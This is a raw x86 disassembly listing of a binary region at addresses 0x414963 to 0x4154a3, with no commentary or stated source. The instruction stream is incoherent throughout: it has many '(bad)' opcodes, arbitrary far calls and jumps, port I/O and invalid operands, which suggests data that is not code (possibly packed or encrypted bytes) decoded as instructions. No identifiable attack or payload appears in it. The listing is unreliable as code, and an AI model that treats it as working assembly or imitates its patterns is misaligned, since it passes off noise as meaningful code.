  414963:	iret   
  414964:	fwait
  414965:	xchg   edi,eax
  414966:	pop    ecx
  414967:	mov    al,ds:0xc3f35de5
  41496c:	lds    eax,FWORD PTR [eax]
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	sub    eax,0x60e5ac96
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    bh,bh
  4149eb:	add    BYTE PTR [eax],al
  4149ed:	add    BYTE PTR ds:0xba713504,ch
  4149f3:	mov    al,0xdc
  4149f5:	pop    ecx
  4149f6:	cmp    eax,0xbff06db2
  4149fb:	push   ebp
  4149fc:	data16 or BYTE PTR [eax+0xa],ch
  414a00:	ret    
  414a01:	mov    edx,0x44398584
  414a06:	test   BYTE PTR [edi+0x2a900411],bl
  414a0c:	ret    
  414a0d:	mov    bh,BYTE PTR [ecx-0x7b]
  414a10:	lods   al,BYTE PTR ds:[esi]
  414a11:	call   FWORD PTR [edx-0x4d138ecc]
  414a17:	inc    esi
  414a18:	int    0x70
  414a1a:	pop    edi
  414a1b:	dec    ecx
  414a1c:	retf   0x2a8b
  414a1f:	test   DWORD PTR [ebp+0x39426e6f],edi
  414a25:	pop    ss
  414a26:	cli    
  414a27:	mov    ds:0x9d52e012,eax
  414a2c:	fmul   QWORD PTR [eax-0x67]
  414a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a30:	bound  edi,QWORD PTR [eax+edi*1-0x125fe233]
  414a37:	daa    
  414a38:	imul   eax,ebp,0xffffffe4
  414a3b:	test   BYTE PTR ds:0x27f5b65,al
  414a41:	xor    BYTE PTR [edx+0x4],0xbf
  414a45:	push   ecx
  414a46:	push   0x18
  414a48:	scas   al,BYTE PTR es:[edi]
  414a49:	sub    al,BYTE PTR [ebx-0x6f]
  414a4c:	inc    edx
  414a4d:	jg     0x414a52
  414a4f:	cmp    al,0x1b
  414a51:	jbe    0x414ab2
  414a53:	das    
  414a54:	dec    edx
  414a55:	inc    ebx
  414a56:	xor    eax,0xdc90398a
  414a5b:	lods   al,BYTE PTR ds:[esi]
  414a5c:	ss add eax,0xb8dfba63
  414a62:	cwde   
  414a63:	xchg   ecx,eax
  414a64:	sbb    edx,DWORD PTR [edi]
  414a66:	adc    BYTE PTR [ebp+0x1d4bdd3d],bh
  414a6c:	mov    cl,0x4e
  414a6e:	in     eax,0x59
  414a70:	fst    QWORD PTR [ebx-0x148e3580]
  414a76:	sbb    eax,0x645d5e8
  414a7b:	fsubr  DWORD PTR [ebp+0x31]
  414a7e:	push   ebx
  414a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a80:	lods   eax,DWORD PTR ds:[esi]
  414a81:	mov    cl,0xca
  414a83:	jg     0x414ab9
  414a85:	mov    ds:0xd944e79b,al
  414a8a:	sti    
  414a8b:	dec    ebx
  414a8c:	mov    al,0x9f
  414a8e:	retf   
  414a8f:	test   DWORD PTR [ebx],0xb1016a43
  414a95:	fild   WORD PTR [esi+0x77]
  414a98:	fs mov dh,0x8
  414a9b:	ins    DWORD PTR es:[edi],dx
  414a9c:	push   edi
  414a9d:	out    dx,eax
  414a9e:	push   0xffffffb7
  414aa0:	call   0xf349:0x6ac858fa
  414aa7:	fcmovb st,st(1)
  414aa9:	mov    al,0xb2
  414aab:	aad    0x64
  414aad:	or     BYTE PTR [eax+eax*1-0x6c],al
  414ab1:	jmp    0x414acf
  414ab3:	cmp    edx,0xffffffa9
  414ab6:	cmp    ebx,0x63
  414ab9:	push   edx
  414aba:	repz lds eax,FWORD PTR [edi+0x5850ec29]
  414ac1:	pop    ebx
  414ac2:	and    al,0xc9
  414ac4:	push   0x2d
  414ac6:	leave  
  414ac7:	push   ss
  414ac8:	xchg   edx,eax
  414ac9:	mul    dh
  414acb:	push   ebp
  414acc:	sbb    edi,DWORD PTR [ecx]
  414ace:	cld    
  414acf:	inc    ebp
  414ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad1:	cmp    al,0xff
  414ad3:	mov    esp,0xbabc8082
  414ad8:	sbb    DWORD PTR [ebx+esi*8-0xf05512b],eax
  414adf:	(bad)  
  414ae0:	sub    BYTE PTR [eax-0x1e1aed3e],al
  414ae6:	je     0x414b10
  414ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ae9:	int    0x12
  414aeb:	adc    DWORD PTR [ebp+0x0],ecx
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx+0x7f3063d9]
  414b64:	add    eax,0xdf5f5a
  414b69:	add    bh,bh
  414b6b:	add    BYTE PTR [eax],al
  414b6d:	add    BYTE PTR [eax+ebx*1],dh
  414b70:	sub    al,0x62
  414b72:	dec    edi
  414b73:	mov    bl,0xc8
  414b75:	xor    eax,0x14d11dc6
  414b7a:	cs (bad) 
  414b7c:	sub    BYTE PTR [esi],dl
  414b7e:	adc    dl,BYTE PTR [esi-0xfe3cdcb]
  414b84:	(bad)  
  414b85:	std    
  414b86:	inc    esi
  414b87:	or     al,0x78
  414b89:	test   BYTE PTR [ebp+0x7fa9405d],ch
  414b8f:	jg     0x414bca
  414b91:	cmc    
  414b92:	shr    DWORD PTR [ebp+0x2e5666db],1
  414b98:	adc    ch,BYTE PTR [ebx+0x59]
  414b9b:	(bad)  
  414b9c:	fidivr DWORD PTR [ecx+ecx*8+0x53e37339]
  414ba3:	loop   0x414bda
  414ba5:	rol    DWORD PTR [edi-0x2e0a700e],0x8d
  414bac:	sbb    BYTE PTR [ecx],cl
  414bae:	(bad)  [esi-0x3f98a16b]
  414bb4:	lahf   
  414bb5:	loope  0x414b73
  414bb7:	pop    eax
  414bb8:	out    dx,eax
  414bb9:	call   0xa957c153
  414bbe:	xor    eax,0xf15f288b
  414bc3:	and    ebx,0x15665028
  414bc9:	mov    ebp,0xf606ffbf
  414bce:	push   ds
  414bcf:	sbb    DWORD PTR [esi],eax
  414bd1:	inc    edi
  414bd2:	loopne 0x414c01
  414bd4:	call   0xcd15:0x481093ae
  414bdb:	pop    eax
  414bdc:	and    eax,0x9247cde5
  414be1:	and    al,0x74
  414be3:	rcr    BYTE PTR [ebx+0xda94fb2],cl
  414be9:	mov    bl,0x3c
  414beb:	sbb    DWORD PTR [esp+eiz*2-0x3878bbe4],eax
  414bf2:	xor    BYTE PTR [edx+0x38],dh
  414bf5:	dec    edx
  414bf6:	ins    BYTE PTR es:[edi],dx
  414bf7:	mov    al,dh
  414bf9:	psubd  mm5,QWORD PTR [esi+0x7c]
  414bfd:	nop
  414bfe:	pop    es
  414bff:	test   BYTE PTR [edx-0x6882d95a],0x43
  414c06:	xchg   DWORD PTR [ecx-0x2f],eax
  414c09:	pop    ebp
  414c0a:	xor    DWORD PTR [eax-0x2],eax
  414c0d:	pop    ebx
  414c0e:	push   0x36
  414c10:	jae    0x414c21
  414c12:	jmp    0xd828:0xdb333fc7
  414c19:	xchg   edx,eax
  414c1a:	or     eax,0xbedf6b46
  414c1f:	jne    0x414c30
  414c21:	cdq    
  414c22:	mov    ebp,0x14ff6fdb
  414c27:	push   ds
  414c28:	and    ebp,DWORD PTR [edx+0x527b9e17]
  414c2e:	pop    ecx
  414c2f:	pop    ebx
  414c30:	fld    DWORD PTR [ecx+0x59]
  414c33:	int3   
  414c34:	ret    
  414c35:	pause  
  414c37:	sub    esp,ecx
  414c39:	jae    0x414c89
  414c3b:	adc    al,0x94
  414c3d:	jle    0x414cbb
  414c3f:	mov    ecx,0xf2312d0b
  414c44:	shl    bh,0x3f
  414c47:	mov    al,0x56
  414c49:	inc    esi
  414c4a:	das    
  414c4b:	ss in  al,0x61
  414c4e:	lea    edi,[edx-0x4f878d5e]
  414c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c55:	push   esp
  414c56:	mov    ds:0x3e8e5446,al
  414c5b:	and    dl,ch
  414c5d:	push   ss
  414c5e:	mov    ebp,0x726f41b5
  414c63:	pop    esi
  414c64:	jmp    eax
  414c66:	stos   BYTE PTR es:[edi],al
  414c67:	or     al,0x40
  414c69:	(bad)  
  414c6b:	(bad)  
  414c6c:	dec    ecx
	...
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    esp,DWORD PTR cs:[edx+0x5e4848cc]
  414ce7:	loopne 0x414ce9
  414ce9:	add    bh,bh
  414ceb:	add    BYTE PTR [eax],al
  414ced:	add    BYTE PTR [esi],cl
  414cef:	dec    ebx
  414cf0:	jns    0x414d48
  414cf2:	xchg   esp,eax
  414cf3:	pop    ebp
  414cf4:	mov    ?,WORD PTR [ebp-0x45fb568e]
  414cfa:	push   0xffffffc7
  414cfc:	and    BYTE PTR [edi+0x39],dh
  414cff:	dec    DWORD PTR [edx-0x6]
  414d02:	sbb    eax,0x9213d3e5
  414d07:	adc    eax,0xae5daada
  414d0c:	mov    eax,0xc7e23f81
  414d11:	xchg   esp,eax
  414d12:	xchg   esi,eax
  414d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d14:	inc    BYTE PTR [edi+ebp*8+0x33]
  414d18:	jle    0x414d51
  414d1a:	add    al,BYTE PTR [ecx]
  414d1c:	adc    edi,DWORD PTR [ecx+0x7b51fee9]
  414d22:	cdq    
  414d23:	retf   0x68c0
  414d26:	call   0xd4dd:0xd27466cb
  414d2d:	dec    ebp
  414d2e:	jae    0x414cfd
  414d30:	xchg   ecx,eax
  414d31:	push   edx
  414d32:	test   BYTE PTR [edx+0x4324d208],cl
  414d38:	enter  0xc0a3,0xdd
  414d3c:	movzx  ecx,BYTE PTR [edi]
  414d3f:	or     DWORD PTR [edx+0x7cd44306],esi
  414d45:	in     eax,0xb4
  414d47:	push   edx
  414d48:	jmp    0x9fbd12a3
  414d4d:	push   ds
  414d4e:	xchg   BYTE PTR [edi+0x2f5cc8ee],dh
  414d54:	adc    eax,0x434e2d6d
  414d59:	sub    ch,BYTE PTR [ebp+0x35]
  414d5c:	out    0x95,al
  414d5e:	test   dh,al
  414d60:	xchg   esp,eax
  414d61:	mov    edi,0x6b9d043a
  414d66:	and    eax,ecx
  414d68:	push   ecx
  414d69:	mov    ds:0x26ac51e0,al
  414d6e:	and    al,0x78
  414d70:	mov    cl,0xfc
  414d72:	imul   ebp,DWORD PTR [eax+0x25a9395a],0x7535bee8
  414d7c:	inc    eax
  414d7d:	sub    ch,BYTE PTR [eax-0x787b9d2d]
  414d83:	lds    edi,FWORD PTR [ebp+ecx*8+0x43]
  414d87:	mov    eax,ds:0xe636c4b8
  414d8c:	push   0x9f311a7b
  414d91:	rol    BYTE PTR [edx],0x66
  414d94:	pop    esi
  414d95:	inc    edx
  414d96:	mov    al,ds:0x82c3b6c0
  414d9b:	jmp    0x18be:0xa031abf3
  414da2:	push   0x410e369c
  414da7:	stos   BYTE PTR es:[edi],al
  414da8:	arpl   sp,di
  414daa:	std    
  414dab:	fst    DWORD PTR gs:[ebp-0x13a32baf]
  414db2:	xor    ebx,DWORD PTR [ebx]
  414db4:	jae    0x414d8f
  414db6:	fstp   DWORD PTR [ebx-0x1]
  414db9:	mov    ?,WORD PTR [esi]
  414dbb:	inc    eax
  414dbc:	lock retf 
  414dbe:	fisubr WORD PTR [eax+0x436773bc]
  414dc4:	cmp    al,0xa9
  414dc6:	jo     0x414df5
  414dc8:	mov    ebp,0xecfd967c
  414dce:	lods   al,BYTE PTR ds:[esi]
  414dcf:	adc    eax,0x1a429b90
  414dd4:	stos   BYTE PTR es:[edi],al
  414dd5:	push   ss
  414dd6:	sahf   
  414dd7:	sbb    bh,BYTE PTR [esi+0x7181636]
  414ddd:	sbb    al,0xa1
  414ddf:	outs   dx,DWORD PTR ds:[esi]
  414de0:	xor    DWORD PTR [edx],ebp
  414de2:	jl     0x414dc1
  414de4:	add    eax,0xa2e44581
  414de9:	add    BYTE PTR [esi+0x6951],0x0
	...
  414e54:	add    BYTE PTR [eax],al
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0xe1c31b2a
  414e66:	pop    ebp
  414e67:	loope  0x414e69
  414e69:	add    bh,bh
  414e6b:	add    BYTE PTR [eax],al
  414e6d:	add    bl,cl
  414e6f:	icebp  
  414e70:	inc    edx
  414e71:	adc    al,0x96
  414e73:	mov    ebp,0x8cd42c6d
  414e78:	xchg   edi,eax
  414e79:	and    BYTE PTR [ebp-0x170d70a0],al
  414e7f:	mov    esi,0xc54c568b
  414e84:	test   eax,0x10aaf830
  414e89:	mov    DWORD PTR [eax+0x5c6a936b],esi
  414e8f:	pop    ecx
  414e90:	or     eax,ebx
  414e92:	nop
  414e93:	pusha  
  414e94:	add    eax,0xd980d1cf
  414e99:	outs   dx,DWORD PTR ds:[esi]
  414e9a:	jne    0x414e1c
  414e9c:	cmp    ch,dl
  414e9e:	sub    eax,DWORD PTR fs:[ecx]
  414ea1:	test   BYTE PTR [ebx+0xbaa9473],al
  414ea7:	scas   eax,DWORD PTR es:[edi]
  414ea8:	mov    eax,0xc1329599
  414ead:	mov    al,ds:0x530ad1e8
  414eb2:	xlat   BYTE PTR ds:[ebx]
  414eb3:	xchg   DWORD PTR [edx-0x7c],ebp
  414eb6:	sub    BYTE PTR [ecx-0x771abc9b],0xa
  414ebd:	jo     0x414ed7
  414ebf:	xor    eax,0x67d890c1
  414ec4:	push   ecx
  414ec5:	xor    eax,0x99fdbad8
  414eca:	sbb    ecx,DWORD PTR [esi+ecx*1-0x44bd2cd8]
  414ed1:	inc    edx
  414ed2:	pusha  
  414ed3:	or     ah,BYTE PTR [ecx-0x80]
  414ed6:	sub    al,0x30
  414ed8:	mov    eax,ds:0x516aa018
  414edd:	repz (bad) 
  414ee0:	out    0xfb,eax
  414ee2:	and    DWORD PTR [edi],edx
  414ee4:	or     BYTE PTR [esi],dh
  414ee6:	stos   DWORD PTR es:[edi],eax
  414ee7:	jl     0x414ec6
  414ee9:	lds    edi,FWORD PTR [edx]
  414eeb:	pop    ebp
  414eec:	pop    ebp
  414eed:	cmp    ebp,eax
  414eef:	xor    dh,BYTE PTR [esi-0x43aaf2]
  414ef5:	or     edx,esp
  414ef7:	js     0x414e7a
  414ef9:	cwde   
  414efa:	jae    0x414edb
  414efc:	push   ds
  414efd:	(bad)  
  414efe:	cmc    
  414eff:	std    
  414f00:	push   ebx
  414f01:	or     DWORD PTR [ebx-0x18],0x68
  414f05:	imul   esi,DWORD PTR [eax-0x5beda2a1],0xb791b53e
  414f0f:	xor    ebx,DWORD PTR [ecx+0x70]
  414f12:	mov    dl,0x2c
  414f14:	scas   al,BYTE PTR es:[edi]
  414f15:	pop    ds
  414f16:	pop    ebp
  414f17:	shr    al,0x71
  414f1a:	aad    0x71
  414f1c:	push   edi
  414f1d:	out    0x24,al
  414f1f:	js     0x414f6c
  414f21:	ret    0xe3e
  414f24:	push   eax
  414f25:	enter  0xaf46,0x57
  414f29:	sub    edx,DWORD PTR [ecx-0x3d]
  414f2c:	lahf   
  414f2d:	push   0xffffffe4
  414f2f:	push   ds
  414f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f31:	aas    
  414f32:	and    ebp,DWORD PTR [eax+0x6e493ca6]
  414f38:	dec    ebp
  414f39:	out    dx,eax
  414f3a:	xor    eax,0x150e680f
  414f3f:	inc    edi
  414f40:	cmp    esi,DWORD PTR [ebp+0x63]
  414f43:	nop
  414f44:	push   esp
  414f45:	cmp    al,0x3e
  414f47:	or     DWORD PTR [ecx-0x72c1818a],eax
  414f4d:	adc    BYTE PTR [edi-0x221ccb04],al
  414f53:	scas   al,BYTE PTR es:[edi]
  414f54:	jge    0x414f9b
  414f56:	xor    dh,al
  414f58:	xchg   esp,eax
  414f59:	xchg   ebp,eax
  414f5a:	cmp    BYTE PTR [ebx+0x2fbfe24d],0x97
  414f61:	or     eax,0x64c25a2e
  414f66:	push   ebp
  414f67:	ds pusha 
  414f69:	sahf   
  414f6a:	test   eax,0x4c8e
	...
  414fd3:	add    BYTE PTR [eax],al
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe25c:0x2b7fa3c4
  414fe8:	add    BYTE PTR [eax],al
  414fea:	inc    DWORD PTR [eax]
  414fec:	add    BYTE PTR [eax],al
  414fee:	out    0xe,al
  414ff0:	pusha  
  414ff1:	rol    DWORD PTR [edi+esi*8],0x20
  414ff5:	into   
  414ff6:	leave  
  414ff7:	dec    ebx
  414ff8:	test   eax,0x9b0e80e5
  414ffd:	push   esi
  414ffe:	jb     0x414ffc
  415000:	add    eax,0xddd4c077
  415005:	pop    edi
  415006:	sub    eax,0xab2da12d
  41500b:	ja     0x414fe3
  41500d:	xlat   BYTE PTR ds:[ebx]
  41500e:	push   esi
  41500f:	push   ecx
  415010:	shl    DWORD PTR [esi-0x79fb5fa7],0x31
  415017:	fwait
  415018:	mov    ah,0x48
  41501a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501b:	jmp    0x414ff1
  41501d:	and    al,0xbe
  41501f:	jle    0x415089
  415021:	xor    eax,0x1d4bc6b4
  415026:	jno    0x415051
  415028:	push   cs
  415029:	sub    edx,DWORD PTR [ecx]
  41502b:	icebp  
  41502c:	sub    eax,0xe7830180
  415031:	(bad)  
  415033:	jo     0x414fe3
  415035:	retf   0x9424
  415038:	push   0x50
  41503a:	popa   
  41503b:	out    0x46,eax
  41503d:	add    eax,0xcc8db79c
  415042:	push   ecx
  415043:	dec    esp
  415044:	pop    ebp
  415045:	retf   
  415046:	scas   al,BYTE PTR es:[edi]
  415047:	pop    eax
  415048:	fsubr  QWORD PTR [edx+0x25b97c42]
  41504e:	fcmovnu st,st(0)
  415050:	adc    al,0x2d
  415052:	push   cs
  415053:	dec    edx
  415054:	cs (bad) 
  415056:	push   eax
  415057:	xchg   edi,eax
  415058:	in     al,0x92
  41505a:	adc    eax,0x427bf9c8
  41505f:	cwde   
  415060:	mov    al,BYTE PTR [edi+0x43]
  415063:	sub    DWORD PTR [esi-0x78f7484b],esi
  415069:	out    dx,eax
  41506a:	fwait
  41506b:	jmp    0x41509b
  41506d:	les    esi,FWORD PTR [ebp+0x786540af]
  415073:	cld    
  415074:	cmc    
  415075:	aas    
  415076:	loop   0x4150cb
  415078:	sub    BYTE PTR [edx],dl
  41507a:	cmp    ecx,DWORD PTR [ebx]
  41507c:	jmp    0xdef2:0xe82f706b
  415083:	adc    ecx,ebp
  415085:	out    dx,al
  415086:	out    0x19,eax
  415088:	mov    bh,0x55
  41508a:	out    dx,eax
  41508b:	sub    bl,BYTE PTR [ebp-0xd987d63]
  415091:	mov    dh,0xe3
  415093:	inc    eax
  415094:	cmp    edi,DWORD PTR [esi+0x3ee33d6a]
  41509a:	push   0xafe96341
  41509f:	lods   al,BYTE PTR ds:[esi]
  4150a1:	add    bh,BYTE PTR [ebp-0x3f]
  4150a4:	xchg   esp,eax
  4150a5:	cmp    cl,al
  4150a7:	xor    eax,0x93f3ebdb
  4150ac:	loopne 0x415082
  4150ae:	mov    cl,0x67
  4150b0:	pusha  
  4150b1:	mov    ds:0x1ee75d8a,eax
  4150b6:	push   edx
  4150b7:	enter  0xaf35,0x46
  4150bb:	adc    eax,0xce6ab024
  4150c0:	jmp    0x6585ebc0
  4150c5:	sub    al,0x5c
  4150c7:	mov    ds:0x62362c91,al
  4150cc:	adc    edx,edx
  4150ce:	xlat   BYTE PTR ds:[ebx]
  4150cf:	cld    
  4150d0:	je     0x4150ab
  4150d2:	repnz xor BYTE PTR [eax-0x44a5c2e3],bl
  4150d9:	in     al,0x37
  4150db:	out    0xa7,eax
  4150dd:	pop    ebx
  4150de:	adc    esi,DWORD PTR [esi+ebp*1+0x35]
  4150e2:	rcr    BYTE PTR [ebx],cl
  4150e4:	fdivr  DWORD PTR [eax]
  4150e6:	jnp    0x4150ce
  4150e8:	push   fs
  4150ea:	(bad)  
  4150eb:	xchg   al,ch
	...
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xa546fc2d
  415164:	mov    ecx,0xe35b01
  415169:	add    bh,bh
  41516b:	add    BYTE PTR [eax],al
  41516d:	add    BYTE PTR [ebp+0x7f],cl
  415170:	(bad)  
  415171:	mov    eax,0x5148eef4
  415176:	push   edi
  415177:	sar    ah,cl
  415179:	aaa    
  41517a:	lods   eax,DWORD PTR ds:[esi]
  41517b:	daa    
  41517c:	lods   eax,DWORD PTR ds:[esi]
  41517d:	xrelease mov DWORD PTR [edx+ebx*8-0x66133367],ebx
  415185:	xchg   esi,eax
  415186:	pusha  
  415187:	bswap  edx
  415189:	xchg   edx,eax
  41518a:	sbb    eax,0xe9402521
  41518f:	mov    ecx,0xf1151a79
  415194:	inc    esp
  415195:	push   ds
  415196:	ins    BYTE PTR es:[edi],dx
  415197:	mov    al,0x26
  415199:	jne    0x415158
  41519b:	or     ebx,DWORD PTR [ecx-0x7e]
  41519e:	nop
  41519f:	sbb    ch,BYTE PTR [eax+0xfbbbdc1]
  4151a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a6:	popa   
  4151a7:	enter  0x774,0x8d
  4151ab:	retf   
  4151ac:	sub    esi,edx
  4151ae:	hlt    
  4151af:	lea    ecx,[ecx+0x1e]
  4151b2:	mov    ah,dl
  4151b4:	mov    cl,dl
  4151b6:	jge    0x41518c
  4151b8:	call   0xe55989a8
  4151bd:	lods   eax,DWORD PTR ds:[esi]
  4151be:	dec    BYTE PTR [edx+0x5a149507]
  4151c4:	dec    ecx
  4151c5:	repz adc eax,0xd7415951
  4151cb:	pop    ecx
  4151cc:	mov    ds:0xfd8c86df,al
  4151d1:	and    eax,0x78efe983
  4151d6:	addr16 call 0x93320c59
  4151dc:	mov    dh,BYTE PTR [edx]
  4151de:	jl     0x4151b6
  4151e0:	xor    al,0x9e
  4151e2:	dec    esp
  4151e3:	adc    ch,BYTE PTR ds:0x28e84d52
  4151e9:	cmp    DWORD PTR ss:[edx+0x5bdde12],edx
  4151f0:	js     0x4151b2
  4151f2:	xchg   ebp,eax
  4151f3:	xchg   esi,eax
  4151f4:	jmp    eax
  4151f6:	mov    DWORD PTR [ecx+0x1a0028d2],0xb708777f
  415200:	dec    ebp
  415201:	inc    ebp
  415202:	sub    BYTE PTR [eax],cl
  415204:	and    BYTE PTR [esi],bl
  415206:	test   al,0x4f
  415208:	mov    edi,0xa4596b3
  41520d:	sub    eax,0xad3f0402
  415212:	in     eax,dx
  415213:	aam    0xe6
  415215:	mov    ah,0x8d
  415217:	ret    0x2d10
  41521a:	fdiv   DWORD PTR [ecx+edi*2-0x6c]
  41521e:	lock ficomp WORD PTR [edx]
  415221:	clc    
  415222:	cmp    DWORD PTR [edi],edi
  415224:	popa   
  415225:	inc    ebx
  415226:	pop    es
  415227:	inc    esp
  415228:	adc    al,cl
  41522a:	xchg   esi,eax
  41522b:	loopne 0x4152a8
  41522d:	js     0x4151d3
  41522f:	in     eax,dx
  415230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415231:	inc    eax
  415232:	push   es
  415233:	adc    esp,esp
  415235:	or     BYTE PTR [eax-0x2],0x69
  415239:	and    ecx,DWORD PTR [eax-0x77a04297]
  41523f:	in     eax,0x3e
  415241:	adc    ch,BYTE PTR [eax]
  415243:	inc    esp
  415244:	fdiv   DWORD PTR [edx]
  415246:	or     DWORD PTR [edx+0x42],esi
  415249:	jbe    0x41521e
  41524b:	mov    ebp,0x72345669
  415250:	ret    0x7a1e
  415253:	mov    edi,0xfad015d7
  415258:	push   es
  415259:	rcr    BYTE PTR [ebp+edx*8-0x58a48c44],1
  415260:	iret   
  415261:	in     eax,dx
  415262:	fiadd  WORD PTR [edx+eax*4]
  415265:	mov    ebx,0x8791d597
  41526a:	mov    ah,BYTE PTR [edx+0x31]
	...
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x70c4610b
  4152e5:	xchg   edi,eax
  4152e6:	pop    edx
  4152e7:	in     al,0x0
  4152e9:	add    bh,bh
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	add    BYTE PTR [eax+0x12],dh
  4152f0:	bound  edi,QWORD PTR [ecx-0x78]
  4152f3:	cdq    
  4152f4:	push   edi
  4152f5:	popf   
  4152f6:	fdivp  st(5),st
  4152f8:	int    0xb8
  4152fa:	sub    DWORD PTR [ecx+0x44],edi
  4152fd:	jae    0x4152fc
  4152ff:	inc    eax
  415300:	and    DWORD PTR [ebx+0x4165aca3],eax
  415306:	arpl   WORD PTR [ebx-0x234b8920],cx
  41530c:	adc    BYTE PTR [bx+di-0x4e],cl
  415310:	pop    edi
  415311:	sub    eax,0xa9ce1dee
  415316:	mov    es,WORD PTR [ebx-0xc]
  415319:	imul   ebx,edi,0x17
  41531c:	and    bl,BYTE PTR [esi+esi*8+0x666855ea]
  415323:	mov    BYTE PTR [edx+eiz*4],0x4
  415327:	jmp    0x415303
  415329:	lods   al,BYTE PTR ds:[esi]
  41532a:	mov    ch,0x3b
  41532c:	mov    BYTE PTR [eax-0x35d1b0d7],bh
  415332:	addr16 push esi
  415334:	rcr    DWORD PTR [ecx],1
  415336:	cmp    eax,0x3daab20a
  41533b:	mov    al,ds:0x24df3a1d
  415340:	mov    ecx,0x2602065a
  415345:	loop   0x415395
  415347:	push   DWORD PTR [ecx-0x7f53854a]
  41534d:	mov    dh,BYTE PTR [edx]
  41534f:	xchg   edi,eax
  415350:	ret    
  415351:	idiv   BYTE PTR [eax+0x73]
  415354:	(bad)  
  415355:	shr    bh,1
  415357:	fsubr  QWORD PTR [edi+0x37]
  41535a:	jae    0x415310
  41535c:	jmp    0xc707:0x2e1718d8
  415363:	shl    DWORD PTR [ecx],1
  415365:	les    ecx,FWORD PTR [edx]
  415367:	pop    es
  415368:	sbb    al,0xcd
  41536a:	imul   DWORD PTR [ebx]
  41536c:	sub    BYTE PTR [edi+eiz*8],0xbc
  415370:	popa   
  415371:	push   0x6a53e99f
  415376:	ja     0x415399
  415378:	jl     0x415338
  41537a:	cs mov edx,0x9a45259f
  415380:	mov    eax,ds:0x7e78eaa0
  415385:	add    ebp,DWORD PTR [esp+ebp*1+0x28]
  415389:	lods   al,BYTE PTR ds:[esi]
  41538a:	(bad)  
  41538b:	mov    cl,0x1
  41538d:	jns    0x415349
  41538f:	mov    al,0x55
  415391:	xlat   BYTE PTR fs:[ebx]
  415393:	mov    dh,0x39
  415396:	retf   
  415397:	mov    esi,0x27fe3ed8
  41539c:	out    0xdd,al
  41539e:	xor    BYTE PTR [esi+0x78b99332],bl
  4153a4:	xchg   esp,eax
  4153a5:	ds mov bl,0x7e
  4153a8:	in     al,0x62
  4153aa:	je     0x4153c6
  4153ac:	int    0x27
  4153ae:	popa   
  4153af:	xchg   edx,eax
  4153b0:	sbb    ecx,esp
  4153b2:	mov    BYTE PTR [ebp+0x50],ch
  4153b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b6:	repnz xor ah,bh
  4153b9:	xchg   ebp,eax
  4153ba:	adc    eax,0xb50af324
  4153bf:	popf   
  4153c0:	sbb    DWORD PTR [ebx-0x20],ecx
  4153c3:	mov    dh,0xbc
  4153c5:	inc    ebp
  4153c6:	add    edx,DWORD PTR ds:0xbd5a0340
  4153cc:	cdq    
  4153cd:	cmp    al,0x15
  4153cf:	pop    ebp
  4153d0:	out    dx,eax
  4153d1:	and    al,0x48
  4153d3:	(bad)
  4153d6:	test   al,0xd3
  4153d8:	not    BYTE PTR [esp+eiz*8-0x78add2b9]
  4153df:	icebp  
  4153e0:	pop    ebx
  4153e1:	inc    edi
  4153e2:	jnp    0x415449
  4153e4:	lods   al,BYTE PTR ds:[esi]
  4153e5:	adc    al,0x90
  4153e7:	jg     0x4153ce
  4153e9:	out    0xed,eax
  4153eb:	inc    esp
  4153ec:	pusha  
	...
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x72d3e5b0
  415463:	mov    cl,0x25
  415465:	in     eax,0x59
  415467:	in     eax,0x0
  415469:	add    bh,bh
  41546b:	add    BYTE PTR [eax],al
  41546d:	add    BYTE PTR ds:0xb122a832,dl
  415473:	add    al,0x47
  415475:	cmp    al,0x68
  415477:	pop    ebp
  415478:	js     0x415428
  41547a:	adc    DWORD PTR [edx-0x58],ecx
  41547d:	mov    dl,BYTE PTR [ebp-0x72]
  415480:	mov    al,ds:0x82c090ac
  415485:	ins    BYTE PTR es:[edi],dx
  415486:	out    0xf1,eax
  415488:	sbb    esp,DWORD PTR [eax-0xd352ee4]
  41548e:	and    al,BYTE PTR [edx+0x6c31e824]
  415494:	and    cl,0xc5
  415497:	cdq    
  415498:	add    eax,DWORD PTR [ebx+0x208ef0d6]
  41549e:	xor    eax,0x86358ba7
  4154a3:	mov    edx,0x46bf5f49
